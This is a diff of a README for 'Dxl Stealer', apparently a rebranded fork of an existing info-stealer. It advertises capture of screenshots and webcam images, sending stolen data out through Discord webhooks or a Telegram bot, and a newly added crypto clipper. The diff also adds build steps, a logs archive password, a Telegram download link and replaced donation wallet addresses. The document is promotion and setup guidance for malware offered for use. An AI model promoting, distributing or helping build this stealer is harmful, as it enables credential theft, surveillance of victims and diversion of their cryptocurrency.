@@ -1,10 +1,10 @@
 <h1 align="center">
-   Dxl Stealer 
-https://t.me/dxlstealer
+   ⚔️Dxl Stealer 🛡️
+⭐https://t.me/dxlstealer⭐ DOWNLOAD LATEST VERSİONS  TELEGRAM
 </h1>
 <p align= "center">
    <kbd>
-   <img  src="https://imgur.com/a/OlWaOv3">
+   <img  src="https://github.com/ghatolow/Dxl-Stealer/blob/main/Screenshots/IMG_20240930_190731_757.jpg">
    </kbd><br><br>
    <img src="https://img.shields.io/github/languages/top/Blank-c/Blank-Grabber">
    <img src="https://img.shields.io/github/stars/Blank-c/Blank-Grabber">
@@ -97,6 +97,7 @@ Dxl
     • Captures Screenshot.
     • Captures Webcam Image.
     • Sends All Data Through Discord Webhooks/Telegram Bot.
+     • Crypto clipper.
     (...more)
 
 <!-- Screenshots Section -->
@@ -138,16 +139,16 @@ Dxl
 6. Fill in the fields of the builder and press the <kbd>Build</kbd> button.
 [logs archive passwords:dxl1234]
 
-
+##How to Clipper Build?
+1. Download Python Python version 3.13.0.
+2. Setup  İnstall launcher click  Add to path click.
+3. Dowload Dxl Stealer.
 ## Support the Project
 
 If you find this project useful and would like to show your support, you can make a donation using the following cryptocurrencies:
 
 - **Bitcoin (BTC):**
-  - Wallet Address: bc1quyf7d2cwrd0rgtyhtjt7ermxlw4hzg8npr4yce
+  - Wallet Address: bc1qm75p9ah508gu4lrm0d92lj67wqancddf32u5e9
 
 - **Ethereum (ETH):**
-  - Wallet Address: 0x54Ab5743141c781178863e3F658d48Cb9564f520
-
-- **USDT (Tron network):**
-  - Wallet Address: TJsixSZ9LDpn3ZNF8pEKmfNaNkMTrK1hWJ
+  - Wallet Address: 0x9888DD8B436e3d7ED15c796246E78B89A26a83Ea
